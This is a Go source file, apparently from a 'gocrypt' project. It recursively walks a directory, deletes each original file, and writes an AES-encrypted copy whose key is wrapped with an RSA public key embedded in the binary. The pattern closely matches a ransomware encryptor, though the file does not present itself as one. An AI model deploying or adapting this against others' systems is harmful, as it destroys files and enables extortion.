package main

import (
	_ "embed"
	"log"
	"os"
	"runtime"
	s "sync"

	"github.com/Devil666face/gocrypt/internal/async"
	"github.com/Devil666face/gocrypt/internal/crypt"
	"github.com/Devil666face/gocrypt/internal/io"
	"github.com/Devil666face/gocrypt/internal/sync"
	"github.com/Devil666face/gocrypt/pkg/lib"
)

//go:embed id_rsa.pub
var PubKey string

type encrypt struct {
	in   *crypt.Input
	file lib.File
}

func (e *encrypt) to() error {
	if e.file.Path == "encrypt" {
		return nil
	}
	in, err := io.ReadFile(e.file.Path)
	if err != nil {
		return err
	}
	if err := os.Remove(e.file.Path); err != nil {
		return err
	}
	s := sync.New(in)
	chip, err := s.Encrypt()
	if err != nil {
		return err
	}
	a := async.New(s.AesKey, []byte(e.in.InPassPhrase), func(a *async.Async) {
		a.PubKey = async.Key(PubKey)
	})
	chipAesKey, err := a.EncryptBase64()
	if err != nil {
		return err
	}
	chip = append(chip, chipAesKey...)
	if err := io.WriteFile(chip, e.file.Path+".enc"); err != nil {
		return err
	}
	log.Print(e.file.Path, " encrypted")
	return nil
}

func worker(jobs <-chan encrypt, results chan<- error, wg *s.WaitGroup) {
	defer wg.Done()

	for job := range jobs {
		err := job.to()
		results <- err
	}
}

func main() {
	in := crypt.NewInput()
	// files, err := lib.Walk(in.InPath)
	// if err != nil {
	// 	log.Print(err)
	// }

	files := lib.MustWalk(in.InPath)

	jobs := make(chan encrypt, len(files))
	results := make(chan error, len(files))
	wg := s.WaitGroup{}
	// Start workers
	for i := 1; i <= runtime.NumCPU(); i++ {
		wg.Add(1)
		go worker(jobs, results, &wg)
	}

	// Enqueue jobs
	for _, file := range files {
		e := encrypt{in: in, file: file}
		jobs <- e
	}
	close(jobs)
	wg.Wait()
	close(results)
	for err := range results {
		if err != nil {
			log.Println(err)
		}
	}
}
